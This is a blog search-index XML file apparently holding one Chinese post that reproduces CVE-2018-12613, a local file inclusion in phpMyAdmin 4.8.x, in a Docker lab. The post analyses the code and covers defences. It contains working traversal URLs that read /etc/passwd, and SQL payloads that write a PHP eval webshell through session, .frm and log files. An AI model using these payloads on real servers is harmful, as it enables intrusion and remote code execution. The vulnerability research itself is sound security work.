<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【漏洞复现】CVE-2018-12613 - phpmyadmin后台任意文件包含</title>
      <link href="post/202103242336.html"/>
      <url>post/202103242336.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h2><p>由于对index.php中包含文件的target参数未作严格的安全校验，导致可以被利用绕过白名单、黑名单校验从而进行本地文件包含，达到GetShell和命令执行的效果。</p><p>要想利用该漏洞，攻击者必须经过身份验证，但在这些情况下除外：</p><ol><li>$ cfg [‘AllowArbitraryServer’] =<br>true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</li><li>$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</li></ol><p>影响版本：</p><ul><li>Phpmyadmin Phpmyadmin 4.8.0</li><li>Phpmyadmin Phpmyadmin 4.8.0.1</li><li>Phpmyadmin Phpmyadmin 4.8.1</li></ul><h2 id="0x01-漏洞验证"><a href="#0x01-漏洞验证" class="headerlink" title="0x01 漏洞验证"></a>0x01 漏洞验证</h2><p>Docker拉取靶场环境，创建靶场环境<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808066.png" alt="2020-09-28_21-40-20.png"></p><p>浏览器访问8080端口，即可进入phpmyadmin界面，因为靶场用的是config方式的身份验证，因此不需要使用账号密码登录<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808074.png" alt="2020-09-28_21-57-06.png"></p><p>根据漏洞报告和网上师傅们的复现文章，是在index.php文件处存在本地文件包含漏洞，所以验证代码如下：</p><pre><code>http://192.168.11.12:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code></pre><p>成功读取passwd文件<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808090.png" alt="2020-09-28_22-26-26.png"></p><p>此时可以利用session文件写入**phpinfo()**木马，首先执行SQL语句：</p><pre><code>select &#39;&lt;?php phpinfo() ?&gt;&#39;;</code></pre><p>然后F12查看此时用户的sessionID，也就是phpmyadmin的Cookie值，此值就是Mysql保存在本地的临时会话文件，使用以下url访问该临时文件，即可执行此前插入的木马语句：</p><pre><code>http://192.168.11.12:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_8f36723f61b00567f291c3e7218be400</code></pre><p>注意：需要将sess_后的内容改为自己当前的Cookie值<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808107.png" alt="2020-09-28_22-29-49.png"></p><h2 id="0x02-GetShell"><a href="#0x02-GetShell" class="headerlink" title="0x02 GetShell"></a>0x02 GetShell</h2><h3 id="1-利用sesion文件"><a href="#1-利用sesion文件" class="headerlink" title="1.利用sesion文件"></a>1.利用sesion文件</h3><p>执行以下SQL命令，同上方法访问临时session文件，即可php命令在网站目录下创建a.php并写入一句话</p><pre><code>SELECT `&lt;?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);?&gt;`;</code></pre><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808122.png" alt="2020-09-28_23-19-15.png"></p><p>蚁剑成功连接：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808128.png" alt="2020-09-28_23-19-45.png"></p><p>可打开虚拟终端和文件系统<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808145.png" alt="2020-09-28_23-20-22.png"></p><h3 id="2-利用数据库文件（frm表结构文件）"><a href="#2-利用数据库文件（frm表结构文件）" class="headerlink" title="2.利用数据库文件（frm表结构文件）"></a>2.利用数据库文件（frm表结构文件）</h3><p>通过创建表并将字段名定义为一句话木马，随后利用包含访问该文件即可：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808231.png" alt="2020-09-28_23-53-41.png"></p><p>但是因为我在Docker上搭建的环境，Web和Mysql用的2个主机环境，也就是库站分离，所以无法包含数据库文件，但是可以在Mysql虚拟机里看到木马：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808242.png" alt="2020-09-28_23-48-48.png"></p><p>所以和上边session文件一样，只需要将数据库字段名设置为以下语句：</p><pre><code>SELECT `&lt;?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);?&gt;`;</code></pre><p>然后包含相应的test.frm文件，即可执行命令在网站目录下创建一个a.php的木马</p><p>为了测试，我直接在Web主句目录下写入一个frm文件，然后在phpmyadmin中包含该文件：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808254.png" alt="2020-09-29_00-10-55.png"></p><p>即可创建a.php，蚁剑连接，成功进入shell环境：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808372.png" alt="2020-09-29_00-12-11.png"><br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808378.png" alt="2020-09-29_00-08-37.png"></p><h3 id="3-利用日志文件"><a href="#3-利用日志文件" class="headerlink" title="3.利用日志文件"></a>3.利用日志文件</h3><p>还有就是可以利用日志文件，但是当前环境权限不足，且没有开启日志功能，所以无法复现，具体原理同以上两种方法。</p><p>因为是存在本地文件包含，所以如果不是库站分离的情况下，是不需要修改日志路径为网站根路径的，任意路径即可，只需利用包含漏洞包含该日志文件，执行的php命令是在网站根路径创建新的木马文件。</p><p>打开general_log：set global general_log = on<br>执行以下命令：</p><pre><code>SELECT `&lt;?php fputs(fopen(&quot;/var/www/html/a.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);?&gt;`;</code></pre><p>包含日志文件，即可在网站根目录生成a.php的一句话木马。</p><h2 id="0x03-原理分析"><a href="#0x03-原理分析" class="headerlink" title="0x03 原理分析"></a>0x03 原理分析</h2><p>漏洞形成在index.php文件中，通过includes来加载传入的target参数文件，在第55行到59行对target参数做了过滤：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808394.png" alt="2020-09-29_09-37-25.png"></p><pre><code>// If we have a valid target, let&#39;s load that script insteadif (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) &#123;    include $_REQUEST[&#39;target&#39;];    exit;&#125;</code></pre><ol><li>非空</li><li>是字符串</li><li>不能包含index</li><li>不在target_blacklist黑名单内</li></ol><p>其中target_blacklist内容在50到52行定义：import.php、export.php<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808406.png" alt="2020-09-29_10-32-13.png"></p><p> 第5个校验：通过Core类的checkPageValidity方法校验页面合法性</p><p>在源码中找到Core类，导出到本地<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808419.png" alt="2020-09-29_10-52-45.png"></p><p>在Core类443行找到了checkPageValidity方法：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808430.png" alt="2020-09-29_10-53-58.png"></p><pre><code>public static function checkPageValidity(&amp;$page, array $whitelist = [])    &#123;        if (empty($whitelist)) &#123;            $whitelist = self::$goto_whitelist;        &#125;        if (! isset($page) || !is_string($page)) &#123;            return false;        &#125;        if (in_array($page, $whitelist)) &#123;            return true;        &#125;        $_page = mb_substr(            $page,            0,            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) &#123;            return true;        &#125;        $_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) &#123;            return true;        &#125;        return false;    &#125;</code></pre><p>其中，第452行判断传进的page参数是否在whitelist白名单内，如果在内则判断成功，返回True，因此关键点就是让page也就是$_REQUEST[‘target’]，即target传入的文件名存在于该白名单whitelist内</p><p>该函数中whitelist参数是有默认值的，默认为空，而whitelist白名单又在第445到447行做了判断，判断传入的whitelist参数是否为空，如果为空则将Core类中的$goto_whitelist赋值给whitelist，因为在index.php文件中电泳该方法时并未指定whitelist，因此此时的whitelist内容就是Core类中的goto_whitelist内容</p><p>往前找，在Core类的31行定义了$goto_whitelist，如下：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808471.png" alt="2020-09-29_10-59-57.png"></p><pre><code>public static $goto_whitelist = array(        &#39;db_datadict.php&#39;,        &#39;db_sql.php&#39;,        &#39;db_events.php&#39;,        &#39;db_export.php&#39;,        &#39;db_importdocsql.php&#39;,        &#39;db_multi_table_query.php&#39;,        &#39;db_structure.php&#39;,        &#39;db_import.php&#39;,        &#39;db_operations.php&#39;,        &#39;db_search.php&#39;,        &#39;db_routines.php&#39;,        &#39;export.php&#39;,        &#39;import.php&#39;,        &#39;index.php&#39;,        &#39;pdf_pages.php&#39;,        &#39;pdf_schema.php&#39;,        &#39;server_binlog.php&#39;,        &#39;server_collations.php&#39;,        &#39;server_databases.php&#39;,        &#39;server_engines.php&#39;,        &#39;server_export.php&#39;,        &#39;server_import.php&#39;,        &#39;server_privileges.php&#39;,        &#39;server_sql.php&#39;,        &#39;server_status.php&#39;,        &#39;server_status_advisor.php&#39;,        &#39;server_status_monitor.php&#39;,        &#39;server_status_queries.php&#39;,        &#39;server_status_variables.php&#39;,        &#39;server_variables.php&#39;,        &#39;sql.php&#39;,        &#39;tbl_addfield.php&#39;,        &#39;tbl_change.php&#39;,        &#39;tbl_create.php&#39;,        &#39;tbl_import.php&#39;,        &#39;tbl_indexes.php&#39;,        &#39;tbl_sql.php&#39;,        &#39;tbl_export.php&#39;,        &#39;tbl_operations.php&#39;,        &#39;tbl_structure.php&#39;,        &#39;tbl_relation.php&#39;,        &#39;tbl_replace.php&#39;,        &#39;tbl_row_action.php&#39;,        &#39;tbl_select.php&#39;,        &#39;tbl_zoom_select.php&#39;,        &#39;transformation_overview.php&#39;,        &#39;transformation_wrapper.php&#39;,        &#39;user_password.php&#39;,    );</code></pre><p>所以，只需要将target参数设定在该白名单内，即可成功返回True，但是我们需要做的是给target参数继续传参，达到任意文件包含，所以还需要看下边的？校验。</p><p>网上文章都对456行到473行的？校验做了分析，得到的结果是需要对？进行二次URL编码来绕过校验，但是其实由于代码的逻辑是先用？进行截断，取出？前的文件名来做白名单校验，成功直接返回True，不再执行下边urldecode后的？校验，所以其实不需要对？做编码处理，也可以成功执行：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808488.png" alt="2020-09-29_11-12-41.png"></p><p>但是还是分析一下原理：</p><p>这部分代码是这样的：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808495.png" alt="2020-09-29_11-26-32.png"></p><p>对page参数做了两次？的截断判断，将？前的文件名做白名单校验，第一次直接截断，失败后进行url解码再次截断判断。</p><p>其实也就表示允许target参数带参，如果传入的target参数也是带参的话，同样会将其参数指向的文件包含进来，也正是因为这种机制导致了任意文件包含。</p><p>不得不说phpmyadmin开发人员考虑的太周到了，又是主动urldecode，又是可以参数继续传参，多种判断都可以返回True，真是贴心，泪目~😭😭😭</p><h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>从用户角度来看的话，那就是升级版本，没得说。</p><p>从开发者角度来看，由于未能理解他们可以多次传参的初衷，所以我认为在没有必要的情况下可以将该功能删除，只保留target一次传参，即只能包含白名单内的文件。</p><p>而在后续的版本中也证实了这个观点，开发人员给Core的checkPageValidity方法加了一个include参数，用来标志是否开启连续传参：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808538.png" alt="2020-09-29_13-12-08.png"></p><p>当include参数为True时，即表示不允许多次传参。<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808548.png" alt="2020-09-29_13-12-56.png"></p><p>PS：我怎么jiao的这块开发人员写错了呢🤨，应该是</p><pre><code>if (! $include) &#123;    return false;&#125;</code></pre><p>这样就表示传参为True时，可以连续传参包含，传参为False时不允许，这也和$include的初始值相对应。</p><p>随便想想~</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2018-12613 </tag>
            
            <tag> phpmyadmin任意文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
